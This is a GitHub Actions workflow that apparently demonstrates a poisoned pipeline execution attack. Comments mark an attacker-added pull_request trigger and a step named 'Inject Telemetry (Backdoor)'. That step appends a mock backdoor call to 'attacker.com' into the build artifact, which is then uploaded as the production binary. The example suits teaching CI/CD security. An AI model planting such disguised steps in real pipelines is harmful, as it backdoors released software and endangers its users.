name: Release App
on:
  push:
    branches: [ main ]
  pull_request: # The attacker adds this to trigger the PPE
    branches: [ main ]

jobs:
  build-and-release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Build Application
        run: |
          mkdir -p dist
          echo "Current legitimate application code" > dist/app.exe

      # --- DIRECT PPE PAYLOAD ---
      - name: Inject Telemetry (Backdoor)
        run: |
          echo "INJECTING MALICIOUS CODE..."
          echo "System.Backdoor.Connect('attacker.com')" >> dist/app.exe
      # --- END PAYLOAD ---
          
      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: production-binary
          path: dist/app.exe